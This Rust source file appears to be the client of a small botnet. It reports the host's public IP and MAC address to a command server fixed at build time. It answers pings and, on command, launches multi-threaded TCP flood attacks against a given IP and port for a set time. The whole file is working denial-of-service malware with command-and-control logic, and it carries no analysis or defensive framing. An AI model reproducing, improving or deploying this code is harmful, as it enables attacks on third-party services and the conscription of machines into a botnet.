#![feature(addr_parse_ascii)]
use std::{
    io::{self, ErrorKind, Read, Write},
    net::{Ipv4Addr, SocketAddrV4},
    str::from_utf8,
    time::{Duration, Instant},
};

use anyhow::Result;
use mio::{net::TcpStream, Events, Interest, Poll, Token};
use tiny_botnet::{ClientInitPacket, Messages, TcpFloodPacket};

const CLIENT: Token = Token(0);
const SERVER_ADDR: &str = env!("SERVER_ADDR");
fn main() -> Result<()> {
    let self_ip = get_ip()?;
    println!("got self ip!");
    loop {
        let server_socket = init_server();
        if server_socket.is_err() {
            std::thread::sleep(Duration::from_secs(5));
            continue;
        }

        let mut server_socket = server_socket.unwrap();

        let mut poll = Poll::new()?;
        let mut events = Events::with_capacity(128);

        poll.registry()
            .register(&mut server_socket, CLIENT, Interest::READABLE)?;

        server_socket.write(&Messages::new_packet(Messages::ClientInit(
            ClientInitPacket {
                ip: self_ip.to_string(),
                uuid: mac_address::get_mac_address()?.unwrap().to_string(), //should probably hash this
            },
        ))?)?;

        'inner: loop {
            poll.poll(&mut events, None)?;
            for event in events.iter() {
                if event.is_readable() {
                    let mut received_data = vec![0; 4096];
                    let mut bytes_read = 0;
                    loop {
                        match server_socket.read(&mut received_data[bytes_read..]) {
                            Ok(0) => {
                                break;
                            }
                            Ok(n) => {
                                bytes_read += n;
                                if bytes_read == received_data.len() {
                                    received_data.resize(received_data.len() + 1024, 0);
                                }
                            }
                            Err(ref err) if would_block(err) => break,
                            Err(ref err) if interrupted(err) => continue,
                            Err(_) => {
                                break 'inner;
                            }
                        }
                    }
                    if bytes_read != 0 {
                        let received_data = &received_data[..bytes_read];

                        if let Ok(pkt) = bitcode::decode::<Messages>(received_data) {
                            println!("Received packet: {:?}", pkt);
                            handle_packet(pkt, &server_socket)?;
                        } else {
                            if let Ok(str_buf) = from_utf8(received_data) {
                                println!("Received non packet data: {}", str_buf.trim_end());
                            } else {
                                println!("Received non packet non utf8 data: {:?}", received_data);
                            }
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

fn handle_packet(packet: Messages, mut socket: &TcpStream) -> Result<()> {
    match packet {
        Messages::ServerPing(id) => {
            socket.write(&Messages::new_packet(Messages::ClientPong(id))?)?;
        }
        Messages::TcpfFlood(pkt) => {
            for _ in 0..4 {
                let pkt = pkt.clone();
                std::thread::spawn(|| tcp_flood(pkt).ok());
            }
        }
        _ => {}
    }
    Ok(())
}

fn get_ip() -> Result<Ipv4Addr> {
    let mut stream = std::net::TcpStream::connect("ipinfo.io:80")?;
    let req = b"GET /ip HTTP/1.1\r\nHost: ipinfo.io\r\nConnection: closes\r\n\r\n";
    let ip = loop {
        stream.write_all(req)?;

        let mut buf = vec![0u8; 300];
        stream.read(&mut buf)?;

        let buf = String::from_utf8(buf)?;

        let ip = buf
            .lines()
            .map(|x| {
                x.chars()
                    .filter(|x| x.is_alphanumeric() || x == &'.')
                    .collect::<String>()
            })
            .filter_map(|x| Ipv4Addr::parse_ascii(x.trim().as_bytes()).ok())
            .nth(0);

        if ip.is_some() {
            break ip.unwrap();
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
    };

    Ok(ip)
}

fn init_server() -> Result<TcpStream> {
    loop {
        let mut socket = TcpStream::connect(SERVER_ADDR.parse()?)?;
        match socket.peer_addr() {
            Ok(addr) => {
                // check if the stream is actually connected by trying to write to it
                if let Err(e) = socket.write(&mut []) {
                    std::thread::sleep(std::time::Duration::from_secs(5));

                    continue;
                }
                println!("connected to: {:?}", socket);
                return Ok(socket);
            }
            Err(e) => {
                if e.kind() == ErrorKind::NotConnected {
                    continue;
                }
            }
        }
    }
}
fn would_block(err: &io::Error) -> bool {
    err.kind() == io::ErrorKind::WouldBlock
}

fn interrupted(err: &io::Error) -> bool {
    err.kind() == io::ErrorKind::Interrupted
}

fn tcp_flood(packet: TcpFloodPacket) -> Result<()> {
    let mut target = TcpStream::connect(std::net::SocketAddr::V4(SocketAddrV4::new(
        packet.ip,
        packet.port,
    )))?;
    let start_time = Instant::now();
    println!("Attack started for {} on port {}", packet.ip, packet.port);

    while start_time.elapsed() < packet.time {
        if let Err(e) = target.write(&mut [255]) {
            if e.kind() == ErrorKind::ConnectionAborted {
                break;
            }
            continue;
        }
    }
    println!("attack finished!");

    Ok(())
}
